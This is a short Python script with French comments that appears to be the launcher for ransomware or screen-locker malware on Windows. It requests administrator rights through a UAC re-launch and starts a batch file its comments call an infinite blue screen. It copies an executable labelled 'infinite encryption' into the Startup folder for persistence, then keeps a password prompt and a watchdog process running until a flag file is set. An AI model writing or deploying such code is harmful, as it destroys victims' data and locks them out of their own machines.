import psutil, os, time, ctypes, sys, shutil


def is_admin(): # Fonction pour vérifier si l'utilisateur est administrateur
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin(): # Si l'utilisateur est administrateur
    
    os.system("@ECHO OFF")
    
    with open("is_correct.bool", "w") as bool:
        bool.write("false")
        
    os.system("start /MIN mov.bat") # BSOD INFINI
    shutil.copy("c.exe", "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp") # Cryptage infini
        
    os.system("start /MAX password.exe")
    os.system("start /MIN relaunch.exe")
    time.sleep(2.5)
    
    with open("is_correct.bool", "r") as bool:
        
        while bool.read() != "true":
            if "relaunch.exe" not in (p.name() for p in psutil.process_iter()):
                os.system("start /MIN relaunch.exe")
                time.sleep(1.5)
            elif "password.exe" not in (p.name() for p in psutil.process_iter()):
                os.system("start /MAX password.exe")
                os.system("start c.exe")
                time.sleep(1.5)
    
else: # Sinon relancer le launcher en administrateur
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
